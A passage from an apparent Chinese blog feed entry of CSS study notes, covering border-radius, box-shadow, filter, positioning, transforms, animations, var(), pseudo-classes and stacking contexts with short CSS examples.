"data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2022/01/11/7m1wcj.png" alt="7m1wcj.png"></a></p><h2 id="border-radius"><a href="#border-radius" class="headerlink" title="border-radius"></a>border-radius</h2><p><code>border-radius</code>允许你设置元素的外边框圆角当使用<strong>一个半径时确定一个圆形</strong>,当使用<strong>两个半径时确定一个椭圆</strong></p><p>这个(椭)圆与边框的交集形成圆角效果。</p><p>该属性是一个简写属性,是为了将这四个属性 <code>border-top-left-radius</code> 、<code>border-top-right-radius</code> 、<code>border-bottom-right-radius</code>和 <code>border-bottom-left-radius</code> 简写为一个属性。</p><p>即使元素<strong>没有边框</strong>,圆角也可以用到 <code>background</code> 上面,具体效果受 <code>background-clip</code> 影响。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 右上和左下设置圆角*/</span></span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">0</span> <span class="number">12vmin</span> <span class="number">0</span> <span class="number">12vmin</span>;</span><br><span class="line"><span class="comment">/* 圆形*/</span></span><br><span class="line"><span class="attribute">width</span>: <span class="number">60vmin</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">60vmin</span>;</span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">50%</span>;</span><br></pre></td></tr></table></figure><h2 id="box-shadow"><a href="#box-shadow" class="headerlink" title="box-shadow"></a>box-shadow</h2><p>用于在元素的框架上添加阴影效果。你可以在同一个元素上设置多个阴影效果，并用逗号将他们分隔开。该属性可设置的值包括<code>阴影的X轴偏移量</code>、<code>Y轴偏移量</code>、<code>模糊半径</code>、<code>扩散半径</code>和<code>颜色</code>。</p><p>你几乎可以在任何元素上使用<code>box-shadow</code>来添加阴影效果。如果元素同时设置了 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border-radius"><code>border-radius</code></a>属性 ，那么阴影也会有圆角效果。</p><p>如果没有指定<code>inset</code>，默认阴影在边框外，即阴影向外扩散。</p><p>使用 <code>inset</code> 关键字会使得阴影落在盒子内部，这样看起来就像是内容被压低了。 此时阴影会在边框之内 (即使是透明边框）、背景之上、内容之下。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">box-shadow</span>: inset <span class="number">0</span> <span class="number">0</span> <span class="number">1vmin</span> <span class="built_in">rgba</span>(<span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">0.8</span>);</span><br></pre></td></tr></table></figure><p><strong>注意</strong></p><p>ios中<code>box-shadow</code>容易出现bug，一种方式是设置<code>border: none;</code>，使用<code>box-shadow</code>和<code>border-radius</code>可以获得类似<strong>边框</strong>的效果。</p><h2 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h2><p>将模糊或颜色偏移等图形效果应用于元素。滤镜通常用于调整图像，背景和边框的渲染。</p><p>CSS 标准里包含了一些已实现预定义效果的函数。你也可以参考一个 SVG 滤镜，通过一个 URL 链接到 SVG 滤镜元素。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">filter</span>: <span class="built_in">drop-shadow</span>( -<span class="number">0.8vmin</span> -<span class="number">0.5vmin</span> <span class="number">0.3vmin</span>  <span class="built_in">rgb</span>(<span class="number">216</span>, <span class="number">59</span>, <span class="number">59</span>));</span><br></pre></td></tr></table></figure><h3 id="drop-shadow"><a href="#drop-shadow" class="headerlink" title="drop-shadow()"></a>drop-shadow()</h3><p>为输入图像添加投影效果。投影实际上是输入图像的alpha蒙版的一个模糊的、偏移的版本，用特定的颜色绘制并合成在图像下面。</p><p><strong>注意:</strong> 这个函数有点类似于 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/box-shadow"><code>box-shadow</code></a> 属性. <code>box-shadow</code> 属性在元素的整个框后面创建一个矩形阴影, 而 <code>drop-shadow()</code> 过滤器则是创建一个符合图像本身形状(alpha通道)的阴影。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop-shadow(offset-x offset-y blur-radius spread-radius <span class="attribute">color</span>)</span><br></pre></td></tr></table></figure><p><strong>注意</strong></p><p><code>drop-shadow()</code>在ios中也会出现bug，但在一些地方又能正常显示，因此尚未找到原因和解决方法。</p><h2 id="position"><a href="#position" class="headerlink" title="position"></a>position</h2><h3 id="static"><a href="#static" class="headerlink" title="static"></a>static</h3><p>该关键字指定元素使用正常的布局行为，即元素在文档常规流中当前的布局位置。</p><p>此时 <code>top</code>, <code>right</code>, <code>bottom</code>, <code>left</code> 和 <code>z-index </code>属性无效。</p><h3 id="relative"><a href="#relative" class="headerlink" title="relative"></a>relative</h3><p>该关键字下，元素先放置在未添加定位时的位置，再在不改变页面布局的前提下调整元素位置（因此会在此元素未添加定位时所在位置留下空白）。</p><p><code>position:relative</code> 对 <code>table-*-group</code>, <code>table-row</code>, <code>table-column</code>, <code>table-cell</code>, <code>table-caption</code> 元素无效。</p><h3 id="absolute"><a href="#absolute" class="headerlink" title="absolute"></a>absolute</h3><p>元素会<strong>被移出正常文档流</strong>，并不为元素预留空间，通过指定元素相对于<strong>最近的非 static 定位祖先元素的偏移</strong>，来确定元素位置。绝对定位的元素可以设置外边距（margins），且<strong>不会与其他边距合并</strong>。</p><h3 id="fixed"><a href="#fixed" class="headerlink" title="fixed"></a>fixed</h3><p>元素会<strong>被移出正常文档流</strong>，并不为元素预留空间，而是通过指定元素相对于<strong>屏幕视口（viewport）</strong>的位置来指定元素位置。元素的位置在屏幕滚动时不会改变。打印时，元素会出现在的<strong>每页的固定位置</strong>。<code>fixed</code> 属性会创建<strong>新的层叠上下文</strong>。当元素祖先的 <code>transform</code>, <code>perspective</code> 或 <code>filter</code> 属性非 <code>none</code> 时，容器由视口改为该祖先。</p><h3 id="sticky"><a href="#sticky" class="headerlink" title="sticky"></a>sticky</h3><p>根据文档的正常流程定位元素，然后根据<code>top</code>、<code>right</code>、<code>bottom</code>和<code>left</code>的值相对于最<strong>近的滚动祖先和包含块(最近的块级祖先)进行偏移</strong>，包括与表相关的元素。该偏移量不会影响任何其他元素的位置。</p><p>此值始终创建新的堆叠上下文。请注意，它到其具有“滚动机制”的最近祖先的粘性元素“粘贴”（当该祖先的<code>overflow</code> 是 <code>hidden</code>, <code>scroll</code>, <code>auto</code>, 或 <code>overlay</code>时），即使该祖先不是最近的实际滚动祖先。这有效地抑制了任何“粘性”行为</p><h2 id="CSS动画"><a href="#CSS动画" class="headerlink" title="CSS动画"></a>CSS动画</h2><h3 id="transform"><a href="#transform" class="headerlink" title="transform"></a>transform</h3><p>**<code>transform</code>**属性允许你旋转，缩放，倾斜或平移给定元素。这是通过修改CSS视觉格式化模型的坐标空间来实现的。</p><p><strong><code>transform-origin</code></strong> 属性让你更改一个元素变形的原点。（默认的转换原点是 <code>center</code>)</p><h4 id="rotate"><a href="#rotate" class="headerlink" title="rotate()"></a>rotate()</h4><p>定义一个旋转属性，将元素在不变形的情况下旋转到不动点周围(如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/transform-origin"><code>transform-origin</code></a> 属性所指定) 。 移动量由指定角度定义;如果为<strong>正值</strong>，则运动将为<strong>顺时针</strong>，如果为负值，则为逆时针 。 180°的旋转称为点反射 (<em>point reflection</em>)。</p><p><code>rotate(a)</code></p><p><em>a</em> 该参数表示<code>angle</code>代表旋转的角度。正角表示顺时针旋转，负角表示逆时针旋转。</p><h4 id="scale"><a href="#scale" class="headerlink" title="scale()"></a>scale()</h4><p>可改变元素的大小。 它可以增大或减小元素的大小，并且缩放量由矢量定义，并且它可以使在一个方向上比另一个方向更多。</p><p>这种变换的特点是矢量的坐标可定义在每个不同方向上各子完成一定比例缩放。如果矢量的两个坐标相等，则缩放是均匀的或各向同性的，并且元素的形状被保留。在这种情况下，缩放函数定义了一个同调变换。</p><p>当超出 <code>[-1, 1]</code>范围外时，缩放将在坐标方向上放大元素；当在该范围内时，它在该方向收缩元素。当等于1时，它什么也不做，当它为负时，它执行点反射和大小修改。</p><h4 id="translate"><a href="#translate" class="headerlink" title="translate()"></a>translate()</h4><p>用于移动元素在平面上的位置。这种变换的特点是矢量的坐标定义了它在每个方向上的移动量。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 父元素相对定位，子元素absolute+transform实现绝对居中 */</span></span><br><span class="line"><span class="selector-class">.forehead</span> &#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">8vmin</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#4D4747</span>;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.forehead</span> <span class="selector-class">.plate</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">30vmin</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">6.5vmin</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#cecece</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0.3vmin</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">1vmin</span>;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translate</span>(-<span class="number">50%</span>, -<span class="number">50%</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 水平方向平移v */</span></span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">translateX</span>(-<span class="number">50%</span>);</span><br></pre></td></tr></table></figure><h4 id="transform对定位元素的影响"><a href="#transform对定位元素的影响" class="headerlink" title="transform对定位元素的影响"></a>transform对定位元素的影响</h4><p>当给一个元素加上<code>transform</code>属性的时候，这个元素就会具有<code>relative</code>的特性,所以<strong>若一个元素的父元素拥有tranform属性，那么子元素在使用定位属性的时候要注意。</strong></p><h3 id="animation"><a href="#animation" class="headerlink" title="animation"></a>animation</h3><p>animation属性是 <code>animation-name</code>,<code>animation-duration</code>, <code>animation-timing-function</code>,<code>animation-delay</code>,<code>animation-iteration-count</code>,<code>animation-direction</code>,<code>animation-fill-mode</code> 和 <code>animation-play-state</code> 属性的一个简写属性形式。</p><h5 id="animation-name"><a href="#animation-name" class="headerlink" title="animation-name"></a>animation-name</h5><p>指定应用的一系列动画,每个名称代表一个由<code>@keyframes</code>定义的动画序列。</p><h5 id="keyframes"><a href="#keyframes" class="headerlink" title="@keyframes"></a>@keyframes</h5><p>关键帧 <strong><code>@keyframes</code></strong> at-rule 规则通过在动画序列中定义关键帧（或waypoints）的样式来控制CSS动画序列中的中间步骤。和 <code>过渡transition</code> 相比，关键帧 <code>keyframes</code> 可以控制动画序列的中间步骤。</p><p>如果一个关键帧规则没有指定动画的开始或结束状态（也就是，<code>0%</code>/<code>from</code> 和<code>100%</code>/<code>to</code>，浏览器将使用元素的现有样式作为起始/结束状态。这可以用来从初始状态开始元素动画，最终返回初始状态。</p><p>如果在关键帧的样式中使用了不能用作动画的属性，那么这些属性会被忽略掉，支持动画的属性仍然是有效的，不受波及。</p><p>如果一个关键帧中没有出现其他关键帧中的属性，那么这个属性将使用插值（不能使用插值的属性除外，这些属性会被忽略掉）。</p><p>关键帧中出现的 <code>!important</code> 将会被忽略。</p><h5 id="animation-duration"><a href="#animation-duration" class="headerlink" title="animation-duration"></a>animation-duration</h5><p>指定一个动画周期的时长。</p><p>默认值为0s，表示无动画。</p><h5 id="animation-timing-function"><a href="#animation-timing-function" class="headerlink" title="animation-timing-function"></a>animation-timing-function</h5><p>定义CSS动画在每一动画周期中执行的节奏 可能值为一或多个 <code>&lt;timing-function&gt;</code> 。 </p><p>对于关键帧动画来说,<code>timing function</code>作用于<strong>一个关键帧周期</strong>而非整个动画周期,即从关键帧开始开始,到关键帧结束结束。</p><p>定义于一个关键帧区块的缓动函数(animation timing function)应用到该关键帧;另外,若该关键帧没有定义缓动函数,则使用定义于整个动画的缓动函数。</p><h5 id="animation-delay"><a href="#animation-delay" class="headerlink" title="animation-delay"></a>animation-delay</h5><p>定义动画于何时开始，即<strong>从动画应用在元素上到动画开始的这段时间的长度</strong>。</p><p><code>0s</code>是该属性的默认值，代表动画在应用到元素上后立即开始执行。否则，该属性的值代表动画样式应用到元素上后到开始执行前的时间长度；</p><p>定义一个<strong>负值</strong>会让动画立即开始。但是动画会从它的动画序列中某位置开始。例如，如果设定值为-1s，动画会从它的动画序列的第1秒位置处立即开始。</p><p>如果为动画延迟指定了一个负值，但起始值是隐藏的，则从动画应用于元素的那一刻起就获取起始值。</p><h5 id="animation-iteration-count"><a href="#animation-iteration-count" class="headerlink" title="animation-iteration-count"></a>animation-iteration-count</h5><p>定义动画在结束前运行的<strong>次数</strong> </p><p>可以是1次/无限循环<code>infinite</code>. 如果指定了多个值,每次播放动画时,将使用列表中的下一个值,在使用最后一个值后循环回第一个值。</p><p>动画播放的次数；默认值为<code>1</code>。可以用小数定义循环，来播放动画周期的一部分：例如，<code>0.5</code> 将播放到动画周期的一半。不可为负值。</p><h5 id="animation-direction"><a href="#animation-direction" class="headerlink" title="animation-direction"></a>animation-direction</h5><p>指示动画是否反向播放</p><p><code>normal</code> 每个循环内动画向前循环，换言之，<strong>每个动画循环结束，动画重置到起点重新开始</strong>，这是默认属性。</p><p><code>alternate</code> <strong>动画交替反向运行，反向运行时，动画按步后退，同时，带时间功能的函数也反向</strong>，比如，<code>ease-in</code> 在反向时成为 <code>ease-out</code>。计数取决于开始时是奇数迭代还是偶数迭代</p><p><code>reverse</code> 反向运行动画，每周期结束动画由尾到头运行。</p><p><code>alternate-reverse</code>反向交替， 反向开始交替。动画<strong>第一次运行时是反向的，然后下一次是正向</strong>，后面依次循环。决定奇数次或偶数次的计数从1开始。</p><h5 id="animation-fill-mode"><a href="#animation-fill-mode" class="headerlink" title="animation-fill-mode"></a>animation-fill-mode</h5><p>设置CSS动画在执行之前和之后如何将样式应用于其目标</p><p><code>none</code> 当动画未执行时，动画将不会将任何样式应用于目标，而是已经赋予给该元素的 CSS 规则来显示该元素。这是默认值。</p><p><code>forwards</code> 目标将保留由执行期间遇到的<strong>最后一个关键帧计算值</strong>。 最后一个关键帧取决于<code>animation-direction</code>和<code>animation-iteration-count</code>的值。</p><p><code>backwards</code> 动画将在应用于目标时<strong>立即应用第一个关键帧中定义的值</strong>，并在<code>animation-delay</code>期间保留此值。 第一个关键帧取决于<code>animation-direction</code>的值。</p><p><code>both</code> 动画将遵循<code>forwards</code>和<code>backwards</code>的规则，从而在两个方向上扩展动画属性。</p><h5 id="animation-play-state"><a href="#animation-play-state" class="headerlink" title="animation-play-state"></a>animation-play-state</h5><p>定义一个动画是否运行或者暂停。 </p><p>可以通过查询它来确定动画是否正在运行。</p><p>另外,它的值可以被设置为暂停和恢复的动画的重放。</p><p>恢复一个已暂停的动画,将从它开始暂停的时候,而不是从动画序列的起点开始在动画</p><p><code>running</code> 当前动画正在运行。</p><p><code>paused</code> 当前动画已被停止。</p><h3 id="transition"><a href="#transition" class="headerlink" title="transition"></a>transition</h3><p><strong><code>transition</code></strong> 属性是 <code>transition-property</code>，<code>transition-duration</code>，<code>transition-timing-function</code>和 <code>transition-delay</code> 的一个简写属性。</p><p>过渡可以为一个元素<strong>在不同状态之间切换的时候定义不同的过渡效果</strong>。不同的状态可以使用<strong>伪类</strong>定义，比如<code>:hover</code>或<code>:active</code>，或者使用<code>JavaScript</code>动态设置。</p><h2 id="var"><a href="#var" class="headerlink" title="var()"></a>var()</h2><p>**<code>var()</code><strong>函数可以代替元素中任何属性中的值的任何部分。</strong><code>var()</code>**函数不能作为属性名、选择器或者其他除了属性值之外的值。（这样做通常会产生无效的语法或者一个没有关联到变量的值。）</p><p><strong>如果一个属性值在多处被使用，该方法就很有用。</strong></p><p>方法的第一个参数是要替换的自定义属性的名称。函数的可选第二个参数用作回退值。如果第一个参数引用的自定义属性无效，则该函数将使用第二个值。</p><p><code>var( &lt;custom-property-name&gt; , &lt;declaration-value&gt;? )</code></p><ul><li><p><code>&lt;custom-property-name&gt;</code> 自定义属性名</p><p>在实际应用中它被定义为以<strong>两个破折号</strong>（<code>--</code>）开始的任何有效标识符。 自定义属性仅供作者和用户使用; CSS 将永远不会给他们超出这里表达的意义。</p></li><li><p><code>&lt;declaration-value&gt;</code> 声明值（后备值）</p><p>回退值被用来在自定义属性值无效的情况下保证函数有值。回退值可以包含任何字符，但是部分有特殊含义的字符除外。</p></li></ul><h2 id="伪类-伪元素"><a href="#伪类-伪元素" class="headerlink" title="伪类/伪元素"></a>伪类/伪元素</h2><h3 id="伪类"><a href="#伪类" class="headerlink" title="伪类"></a>伪类</h3><p><strong>伪类</strong>是选择器的一种，它用于选择处于<strong>特定状态</strong>的元素，比如当它们是<strong>这一类型的第一个元素</strong>时，或者是<strong>当鼠标指针悬浮在元素上面</strong>的时候。它们表现得会像是你向你的文档的某个部分应用了一个类一样，<strong>帮你在你的标记文本中减少多余的类，让你的代码更灵活、更易于维护</strong>。</p><p>伪类就是开头为<code>冒号:</code>的关键字。</p><h4 id="简单的伪类"><a href="#简单的伪类" class="headerlink" title="简单的伪类"></a>简单的伪类</h4><p><code>:first-child</code> 第一个子元素，<code>:last-child</code>，最后一个子元素 <code>:nth-child()</code> 选中第n个子元素。</p><h4 id="用户动作伪类"><a href="#用户动作伪类" class="headerlink" title="用户动作伪类"></a>用户动作伪类</h4><p>一些伪类仅适用于用户以某种方式与文档交互。这些用户动作伪类，有时称为动态伪类，就像用户在与之交互时添加到元素中的类一样。例子包括：</p><p><code>:hover</code>- 这仅适用于用户在元素上<strong>移动鼠标</strong>，通常是<strong>链接</strong>。</p><p><code>:focus</code> - 仅在用户通过<strong>单击或使用键盘控件</strong>来适用元素。</p><h3 id="伪元素"><a href="#伪元素" class="headerlink" title="伪元素"></a>伪元素</h3><p>伪元素的行为方式类似。但是，它们的行为就像您在标记中添加了一个全新的 HTML 元素，而不是将类应用于现有元素。伪元素以双冒号开头<code>::</code>。</p><p>注意：<strong>一些早期的伪元素使用单冒号语法</strong>，因此您有时可能会在代码或示例中看到这一点。现代浏览器支持具有单冒号或双冒号语法的早期伪元素，<strong>以实现向后兼容性</strong>。</p><p>在 CSS 中，使用<code>::before</code>和<code>::after</code>伪元素以及<code>content</code>属性被称为“生成的内容”，您经常会看到这种技术被用于各种任务。</p><p><strong><code>::before</code></strong>/<code>::after</code>用来创建一个伪元素，作为已选中元素的<strong>第一个</strong>/<strong>最后一个子元素</strong>。通常会配合<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/content"><code>content</code></a>属性来为该元素添加装饰内容。这个虚拟元素<strong>默认是行内元素</strong>。</p><p><strong><code>::before</code></strong>/<code>::after</code>表示法是在<strong>CSS 3</strong>中引入的，<code>::</code>符号是用来区分<strong>伪类</strong>和伪元素的。支持CSS3的浏览器同时也都支持CSS2中引入的表示法<code>:before</code>/<code>:after</code>。</p><p><strong>注:</strong> IE8仅支持<code>:before</code>/<code>:after</code>。</p><h2 id="层叠上下文"><a href="#层叠上下文" class="headerlink" title="层叠上下文"></a>层叠上下文</h2><p>元素提升为一个比较特殊的图层，在三维空间中 <strong>(z轴)</strong> 高出普通元素一等。</p><ul><li>触发条件<ul><li>根层叠上下文(<code>html</code>)</li><li><code>position</code></li><li>css3属性<ul><li><code>flex</code></li><li><code>transform</code></li><li><code>opacity</code></li><li><code>filter</code></li><li><code>will-change</code></li><li><code>-webkit-overflow-scrolling</code></li></ul></li></ul></li><li>层叠等级：层叠上下文在z轴上的排序<ul><li>在同一层叠上下文中，层叠等级才有意义</li><li><code>z-index</code>的优先级最高</li></ul></li></ul><p><a href="https://imgtu.com/i/o3dDRs"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://z3.ax1x.com/2021/11/30/o3dDRs.png" alt="o3dDRs.png"></a></p><blockquote><p>示例</p></blockquote><p><a href="https://imgtu.com/i/HyTAQs"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2022/02/14/HyTAQs.png" alt="HyTAQs.png"></a></p><p>在这个例子中，每个被定位的元素都创建了独自的层叠上下文，因为他们被指定了定位属性和 <code>z-index</code> 值。我们把层叠上下文的层级列在下面：</p><ul><li>Root<ul><li>DIV #1</li><li>DIV #2</li><li>DIV #3<ul><li>DIV #4</li><li>DIV #5</li><li>DIV #6</li></ul></li></ul></li></ul><p>请一定要注意 <code>DIV #4</code>，<code>DIV #5</code> 和 <code>DIV #6</code> 是 <code>DIV #3</code> 的子元素，所以它们的层叠完全在 <code>DIV #3</code> 中被处理。一旦 <code>DIV #3</code> 中的层叠和渲染处理完成，<code>DIV #3</code> 元素<strong>就被作为一个整体传递与兄弟元素的 DIV 在 root（根）元素进行层叠。</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;纯CSS3实现卡通人物眼睛的动画特效&quot;&gt;&lt;a href=&quot;#纯CSS3实现卡通人物眼睛的动画特效&quot; class=&quot;headerlink&quot; title=&quot;纯CSS3实现卡通人物眼睛的动画特效&quot;&gt;&lt;/a&gt;纯CSS3实现卡通人物眼睛的动画特效&lt;/h1&gt;&lt;h2 id=&quot;项</summary>
      
    
    
    
    <category term="项目" scheme="https://lesliewaong.top/categories/%E9%A1%B9%E7%9B%AE/"/>
    
    
    <category term="CSS" scheme="https://lesliewaong.top/tags/CSS/"/>
    
    <category term="HTML" scheme="https://lesliewaong.top/tags/HTML/"/>
    
    <category term="自适应" scheme="https://lesliewaong.top/tags/%E8%87%AA%E9%80%82%E5%BA%94/"/>
    
    <category term="动画" scheme="https://lesliewaong.top/tags/%E5%8A%A8%E7%94%BB/"/>
    
  </entry>
  
</feed>
